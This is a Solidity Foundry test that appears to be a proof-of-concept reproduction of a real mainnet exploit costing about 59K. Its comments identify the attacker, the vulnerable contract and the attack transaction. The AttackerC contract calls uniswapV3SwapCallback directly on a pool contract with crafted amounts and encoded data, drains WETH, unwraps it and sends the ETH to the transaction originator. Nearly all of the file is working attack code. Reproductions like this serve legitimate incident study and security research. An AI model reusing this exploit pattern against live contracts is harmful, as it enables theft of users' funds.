pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 59K
// Attacker : https://etherscan.io/address/0x00bad13fa32e0000e35b8517e19986b93f000034
// Attack Contract : https://etherscan.io/address/0x67004e26f800c5eb050000200075f049aa0090c3
// Vulnerable Contract : https://etherscan.io/address/0x9008d19f58aabd9ed0d60971565aa8510560ab41
// Attack Tx : https://etherscan.io/tx/0x2fc9f2fd393db2273abb9b0451f9a4830aa2ebd5490d453f1a06a8e9e5edc4f9

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x9008d19f58aabd9ed0d60971565aa8510560ab41

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1854538807854649791
// Twitter Guy : https://x.com/TenArmorAlert/status/1854538807854649791
// Hacking God : N/A

address constant addr1 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant attacker = 0x00baD13FA32E0000E35B8517E19986B93F000034;
address constant addr2 = 0xA58cA3013Ed560594557f02420ed77e154De0109;
address constant addr3 = 0x9008D19f58AAbD9eD0D60971565AA8510560ab41;

interface IWETH9 {
    function balanceOf(address) external view returns (uint256);
    function withdraw(uint256) external;
}

interface ICallbackLike {
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external payable;
}

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 21135438-1);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        attC.attack();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

// 0x67004E26F800c5EB050000200075f049AA0090c3
contract AttackerC {
    receive() external payable {}
    function attack() public payable {
        // call uniswapV3SwapCallback on addr2 with provided args and forward msg.value
        bytes memory data = abi.encode(
            uint256(1976408883179648193852),
            addr3,
            addr1,
            address(this)
        );
        
        ICallbackLike(addr2).uniswapV3SwapCallback(
            -1978613680814188858940,
            5373296932158610028,
            data
        );

        uint256 bal = IWETH9(addr1).balanceOf(address(this));
        IWETH9(addr1).withdraw(bal);
        payable(tx.origin).transfer(address(this).balance); // here, we did not transfer tip to coinbase, all to the attacker
    }
  
    fallback() external payable {}
}